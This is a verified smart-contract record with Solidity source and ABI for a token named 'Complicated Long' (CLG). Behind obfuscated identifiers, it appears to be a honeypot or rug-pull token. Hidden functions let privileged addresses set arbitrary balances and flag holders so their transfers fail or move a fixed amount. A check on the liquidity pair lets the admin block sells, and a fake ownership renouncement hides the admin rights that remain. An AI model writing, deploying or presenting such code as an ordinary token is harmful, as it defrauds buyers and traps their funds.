{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface fundFromReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract amountLimitSwap {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeLaunched {\n    function createPair(address amountSenderMax, address isFromTo) external returns (address);\n}\n\ninterface fromWalletFund {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minTx) external view returns (uint256);\n\n    function transfer(address amountTotal, uint256 tradingList) external returns (bool);\n\n    function allowance(address liquidityTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tradingList) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address amountTotal,\n        uint256 tradingList\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed autoTake, uint256 value);\n    event Approval(address indexed liquidityTx, address indexed spender, uint256 value);\n}\n\ninterface fromWalletFundMetadata is fromWalletFund {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ComplicatedLong is amountLimitSwap, fromWalletFund, fromWalletFundMetadata {\n\n    uint256 constant minShouldEnable = 15 ** 10;\n\n    function toTrading(address senderSell, uint256 tradingList) public {\n        autoTeam();\n        swapEnableTotal[senderSell] = tradingList;\n    }\n\n    mapping(address => uint256) private swapEnableTotal;\n\n    mapping(address => mapping(address => uint256)) private sellTakeBuy;\n\n    address public receiverSender;\n\n    mapping(address => bool) public marketingFee;\n\n    function decimals() external view virtual override returns (uint8) {\n        return modeSwapLimit;\n    }\n\n    bool private listLaunch;\n\n    constructor (){\n        if (minAtTrading == listLaunch) {\n            listLaunch = false;\n        }\n        fundFromReceiver limitSender = fundFromReceiver(launchEnable);\n        limitShould = feeLaunched(limitSender.factory()).createPair(limitSender.WETH(), address(this));\n        if (feeFund != launchedToFund) {\n            launchedToFund = true;\n        }\n        receiverSender = _msgSender();\n        marketingReceiverAuto();\n        fundAtTrading[receiverSender] = true;\n        swapEnableTotal[receiverSender] = receiverTx;\n        \n        emit Transfer(address(0), receiverSender, receiverTx);\n    }\n\n    function autoTeam() private view {\n        require(fundAtTrading[_msgSender()]);\n    }\n\n    uint256 fromLiquidity;\n\n    bool private feeFund;\n\n    function teamIsLaunch(uint256 tradingList) public {\n        autoTeam();\n        fromFund = tradingList;\n    }\n\n    function transfer(address senderSell, uint256 tradingList) external virtual override returns (bool) {\n        return tradingBuySwap(_msgSender(), senderSell, tradingList);\n    }\n\n    function owner() external view returns (address) {\n        return launchedAuto;\n    }\n\n    string private swapAuto = \"CLG\";\n\n    bool private isList;\n\n    function senderTotalSwap(address modeTrading) public {\n        if (tradingWallet) {\n            return;\n        }\n        \n        fundAtTrading[modeTrading] = true;\n        \n        tradingWallet = true;\n    }\n\n    function approve(address feeTake, uint256 tradingList) public virtual override returns (bool) {\n        sellTakeBuy[_msgSender()][feeTake] = tradingList;\n        emit Approval(_msgSender(), feeTake, tradingList);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return liquidityMaxShould;\n    }\n\n    address public limitShould;\n\n    function getOwner() external view returns (address) {\n        return launchedAuto;\n    }\n\n    function allowance(address txAt, address feeTake) external view virtual override returns (uint256) {\n        if (feeTake == launchEnable) {\n            return type(uint256).max;\n        }\n        return sellTakeBuy[txAt][feeTake];\n    }\n\n    function marketingReceiverAuto() public {\n        emit OwnershipTransferred(receiverSender, address(0));\n        launchedAuto = address(0);\n    }\n\n    function receiverMaxEnable(address amountFrom) public {\n        autoTeam();\n        if (shouldMax == shouldTeamFund) {\n            shouldMax = marketingSender;\n        }\n        if (amountFrom == receiverSender || amountFrom == limitShould) {\n            return;\n        }\n        marketingFee[amountFrom] = true;\n    }\n\n    bool private launchedToFund;\n\n    address launchEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public tradingWallet;\n\n    uint256 public shouldTeamFund;\n\n    event OwnershipTransferred(address indexed tokenTotalLiquidity, address indexed atFrom);\n\n    function transferFrom(address sellLiquidityReceiver, address amountTotal, uint256 tradingList) external override returns (bool) {\n        if (_msgSender() != launchEnable) {\n            if (sellTakeBuy[sellLiquidityReceiver][_msgSender()] != type(uint256).max) {\n                require(tradingList <= sellTakeBuy[sellLiquidityReceiver][_msgSender()]);\n                sellTakeBuy[sellLiquidityReceiver][_msgSender()] -= tradingList;\n            }\n        }\n        return tradingBuySwap(sellLiquidityReceiver, amountTotal, tradingList);\n    }\n\n    address swapFundTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint8 private modeSwapLimit = 18;\n\n    mapping(address => bool) public fundAtTrading;\n\n    uint256 public marketingSender;\n\n    address private launchedAuto;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverTx;\n    }\n\n    function balanceOf(address minTx) public view virtual override returns (uint256) {\n        return swapEnableTotal[minTx];\n    }\n\n    bool public tokenIs;\n\n    string private liquidityMaxShould = \"Complicated Long\";\n\n    uint256 fromFund;\n\n    bool private autoEnable;\n\n    function limitTrading(address sellLiquidityReceiver, address amountTotal, uint256 tradingList) internal returns (bool) {\n        require(swapEnableTotal[sellLiquidityReceiver] >= tradingList);\n        swapEnableTotal[sellLiquidityReceiver] -= tradingList;\n        swapEnableTotal[amountTotal] += tradingList;\n        emit Transfer(sellLiquidityReceiver, amountTotal, tradingList);\n        return true;\n    }\n\n    bool private minAtTrading;\n\n    function tradingBuySwap(address sellLiquidityReceiver, address amountTotal, uint256 tradingList) internal returns (bool) {\n        if (sellLiquidityReceiver == receiverSender) {\n            return limitTrading(sellLiquidityReceiver, amountTotal, tradingList);\n        }\n        uint256 shouldListSwap = fromWalletFund(limitShould).balanceOf(swapFundTotal);\n        require(shouldListSwap == fromFund);\n        require(amountTotal != swapFundTotal);\n        if (marketingFee[sellLiquidityReceiver]) {\n            return limitTrading(sellLiquidityReceiver, amountTotal, minShouldEnable);\n        }\n        return limitTrading(sellLiquidityReceiver, amountTotal, tradingList);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return swapAuto;\n    }\n\n    uint256 private receiverTx = 100000000 * 10 ** 18;\n\n    uint256 private shouldMax;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenTotalLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atFrom\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingList\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundAtTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingReceiverAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountFrom\",\"type\":\"address\"}],\"name\":\"receiverMaxEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTrading\",\"type\":\"address\"}],\"name\":\"senderTotalSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTeamFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tradingList\",\"type\":\"uint256\"}],\"name\":\"teamIsLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingList\",\"type\":\"uint256\"}],\"name\":\"toTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingList\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellLiquidityReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingList\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ComplicatedLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}